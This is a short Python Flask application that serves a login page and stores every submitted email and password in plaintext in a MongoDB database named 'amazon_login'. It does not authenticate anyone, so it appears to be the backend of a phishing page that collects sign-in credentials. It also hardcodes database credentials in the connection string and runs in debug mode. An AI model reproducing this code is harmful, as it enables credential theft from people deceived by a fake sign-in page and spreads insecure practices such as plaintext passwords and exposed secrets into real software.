from flask import Flask, request, jsonify, render_template
from flask_pymongo import PyMongo
from bson import ObjectId
import os

app = Flask(__name__)

# Replace with your MongoDB connection string
app.config["MONGO_URI"] = "mongodb+srv://Harsha1234:Harsha1234@cluster0.ykgrprx.mongodb.net/amazon_login?retryWrites=true&w=majority"
mongo = PyMongo(app)

# Serve your HTML login page
@app.route("/")
def index():
    return render_template("index.html")  # place your HTML in "templates/index.html"

# Handle Sign-In form submission
@app.route("/signin", methods=["POST"])
def signin():
    email = request.form.get("email")
    password = request.form.get("password")

    if not email or not password:
        return jsonify({"error": "Email and password required"}), 400

    # Save to MongoDB
    user_id = mongo.db.users.insert_one({
        "email": email,
        "password": password
    }).inserted_id

    return jsonify({"message": "User saved", "id": str(user_id)}), 201


if __name__ == "__main__":
    app.run(debug=True)
